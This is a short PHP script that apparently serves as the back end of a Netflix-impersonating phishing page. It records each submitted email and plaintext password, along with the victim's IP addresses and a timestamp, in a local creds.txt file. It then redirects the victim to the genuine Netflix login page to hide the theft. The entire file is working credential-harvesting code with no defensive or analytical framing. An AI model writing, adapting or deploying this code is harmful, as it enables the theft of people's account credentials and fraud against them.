<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $real_ip = $_POST['real_ip'] ?? 'NOT_SET';

    // Server-side IP
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ipList[0]);
    }

    $time = date("Y-m-d H:i:s");
    $logEntry = "[$time] IP: $ip | RealIP: $real_ip | Email: $email | Password: $password\n";

    file_put_contents("creds.txt", $logEntry, FILE_APPEND | LOCK_EX);

    header("Location: https://www.netflix.com/login");
    exit();
} else {
    http_response_code(403);
    echo "403 Forbidden";
    exit();
}
